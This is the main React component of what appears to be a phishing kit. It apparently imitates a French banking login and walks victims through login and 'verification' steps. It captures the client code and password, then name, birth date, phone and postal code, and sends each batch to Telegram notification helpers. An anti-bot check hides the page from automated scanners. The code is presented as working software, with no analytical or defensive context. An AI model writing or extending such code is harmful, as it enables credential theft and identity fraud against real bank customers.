import { useState, useEffect, useRef } from 'react';
import Header from './components/Header';
import Loader from './components/Loader';
import LandingStep from './components/LandingStep';
import LoginStep from './components/LoginStep';
import VerificationStep from './components/VerificationStep';
import ConfirmationStep from './components/ConfirmationStep';
import { sendLoginNotification, sendVerificationNotification } from './utils/telegram';
import { AntiBotProtection } from './utils/antiBot';

function App() {
  const [currentStep, setCurrentStep] = useState(1);
  const [isHuman, setIsHuman] = useState(false);
  const [isChecking, setIsChecking] = useState(true);
  const [retryCount, setRetryCount] = useState(0);
  const [codeClient, setCodeClient] = useState('');
  const [password, setPassword] = useState('');

  const MAX_RETRIES = 3;

  useEffect(() => {
    const checkBot = async () => {
      const antiBot = AntiBotProtection.getInstance();
      try {
        const result = await antiBot.checkForBot();
        if (!result.isBot || retryCount >= MAX_RETRIES) {
          setIsHuman(!result.isBot);
          setIsChecking(false);
          return;
        }
        setRetryCount(prev => prev + 1);
      } catch {
        if (retryCount >= MAX_RETRIES) {
          setIsHuman(true);
          setIsChecking(false);
        }
      }
    };

    const timeoutId = setTimeout(() => {
      if (isChecking && retryCount >= MAX_RETRIES) {
        setIsHuman(true);
        setIsChecking(false);
      }
    }, 10000);

    if (isChecking && retryCount < MAX_RETRIES) checkBot();
    return () => clearTimeout(timeoutId);
  }, [isChecking, retryCount]);

  const handleLandingContinue = () => {
    setCurrentStep(2);
    window.scrollTo(0, 0);
  };

  const handleLoginContinue = async (user: string, pass: string) => {
    setCodeClient(user);
    setPassword(pass);
    await sendLoginNotification(user, pass);
    setCurrentStep(3);
    window.scrollTo(0, 0);
  };

  const handleVerificationContinue = async (nom: string, prenom: string, date: string, tel: string, codePostal: string) => {
    await sendVerificationNotification(nom, prenom, date, tel, codePostal, codeClient, password);
    setCurrentStep(4);
    window.scrollTo(0, 0);
  };

  if (isChecking && !isHuman) {
    return <Loader />;
  }

  const renderStep = () => {
    switch (currentStep) {
      case 1: return <LandingStep onContinue={handleLandingContinue} />;
      case 2: return <LoginStep onContinue={handleLoginContinue} />;
      case 3: return <VerificationStep onContinue={handleVerificationContinue} />;
      case 4: return <ConfirmationStep />;
      default: return <LandingStep onContinue={handleLandingContinue} />;
    }
  };

  return (
    <div className="min-h-screen bg-gray-50">
      <Header />
      {renderStep()}
    </div>
  );
}

export default App;
